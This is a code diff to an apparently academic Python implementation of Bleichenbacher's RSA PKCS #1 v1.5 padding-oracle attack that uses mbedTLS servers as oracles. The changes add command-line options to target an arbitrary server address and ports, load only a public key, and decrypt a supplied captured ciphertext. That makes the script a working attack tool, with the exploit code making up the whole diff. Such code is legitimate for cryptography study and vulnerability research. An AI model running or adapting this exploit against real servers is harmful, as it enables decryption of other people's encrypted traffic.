@@ -8,6 +8,9 @@ from Crypto.PublicKey import RSA
 import subprocess
 import tempfile
 import os
+import argparse
+import time
+import sys
 
 
 def egcd(a, b):
@@ -185,7 +188,7 @@ def narrow_m(key, m_prev, s, B):
     return merge_intervals(intervals)
 
 
-def bleichenbacher_attack(k, key, c, oracles, verbose=False):
+def bleichenbacher_attack(k, key, c, oracles, verbose=False, skip_blinding=False):
     """
     Given an RSA public key and an oracle for conformity of PKCS #1 encryptions, along with a value c, calculate m = (c ** d) mod n
     :param k: length of ciphertext in bytes
@@ -196,8 +199,10 @@ def bleichenbacher_attack(k, key, c, oracles, verbose=False):
     """
     B = 2 ** (8 * (k - 2))
 
-    c = int.from_bytes(c, byteorder='big')
-    s_0, c_0 = blinding(k, key, c, oracles[0])
+    if not skip_blinding:
+        s_0, c_0 = blinding(k, key, c, oracles[0])
+    else:
+        s_0, c_0 = 1, int.from_bytes(c, byteorder="big")
 
     if verbose:
         print("Blinding complete")
@@ -230,52 +235,37 @@ def bleichenbacher_attack(k, key, c, oracles, verbose=False):
     else:
         return None
 
-import time
-import sys
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--num-servers", "-n", type=int, default=1)
+    parser.add_argument("--start-port", "-p", type=int, default=4433)
+    parser.add_argument("--server-addr", "-s", default="127.0.0.1")
+    parser.add_argument("--given-enc", "-c")
+    parser.add_argument("--public-key", "-k", required=True)
+    parser.add_argument("--n-length", "-l", type=int, default=1024)
+    parser.add_argument("--skip-blinding", action="store_true")
+    return parser.parse_args()
+
+def read_pubkey(f, n_bytes):
+    return RSA.RsaKey(n=int.from_bytes(f.read(n_bytes), byteorder="big"),
+            e=int.from_bytes(f.read(n_bytes), byteorder="big"))
 
 if __name__ == "__main__":
-    start_port = 4433
-    if len(sys.argv) > 1:
-        num_servers = int(sys.argv[1])
-    else:
-        num_servers = 1
-    n_length = 1024
-    keyfilename = "priv.key.pem"
-    #keyfile = tempfile.NamedTemporaryFile(suffix=".key.pem", delete=False)
-    #reqfile = tempfile.NamedTemporaryFile(suffix=".csr", delete=False)
-    #crtfile = tempfile.NamedTemporaryFile(suffix=".crt", delete=False)
-    #keyfilename = keyfile.name
-    #reqfilename = reqfile.name
-    #crtfilename = crtfile.name
-    #keyfile.close()
-    #keyfilename = "example-rsa.key.pem"
-    #keygen = subprocess.Popen(["openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt",
-    #    "rsa_keygen_bits:%u" % n_length, "-out", keyfilename])
-    #assert keygen.wait() == 0, "Error generating key."
-    #reqgen = subprocess.Popen(["openssl", "req", "-new", "-key", keyfilename, "-out", reqfilename,
-    #    "-subj", "/C=AU/ST=Some-State/L=Some-City/O=Sadna/OU=Party/CN=Common-Name"])
-    #assert reqgen.wait() == 0, "Error generating csr file."
-    #crtgen = subprocess.Popen(["openssl", "x509", "-req", "-days", "365", "-in", reqfilename,
-    #    "-signkey", keyfilename, "-out", crtfilename])
-    #assert crtgen.wait() == 0, "Error generating crt file."
-    #os.unlink(reqfilename)
-    with open(keyfilename, "rb") as keyfile:
-        key = RSA.import_key(keyfile.read())
-    #serv = subprocess.Popen(["./mbedtls/programs/ssl/ssl_server2", "key_file=" + keyfilename,
-    #        "crt_file=" + crtfilename, "force_version=tls12", "force_ciphersuite=TLS-RSA-PSK-WITH-AES-128-CBC-SHA256", "psk=abcdef"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-    # key = RSA.generate(n_length)
-    pub_key = key.public_key()
-    k = int(n_length / 8)
+    args = parse_args()
+    k = int(args.n_length / 8)
+    with open(args.public_key, "rb") as keyfile:
+        pub_key = read_pubkey(keyfile, k)
 
     oracles = []
-    for port in range(start_port, start_port + num_servers):
-        oracles.append(PKCS1_v1_5_Oracle_MbedTLS(key, port=port))
+    for port in range(args.start_port, args.start_port + args.num_servers):
+        oracles.append(PKCS1_v1_5_Oracle_MbedTLS(pub_key, port=port))
 
-    c = b'\x00' + (k - 1) * bytes([1])
+    if args.given_enc is not None:
+        with open(args.given_enc, "rb") as f:
+            c = f.read()
+    else:
+        c = b'\x00' + (k - 1) * bytes([1])
 
-    result = bleichenbacher_attack(k, pub_key, c, oracles, True)
+    result = bleichenbacher_attack(k, pub_key, c, oracles, True, args.skip_blinding)
     print(result)
 
-    #os.unlink(keyfilename)
-    #os.unlink(crtfilename)
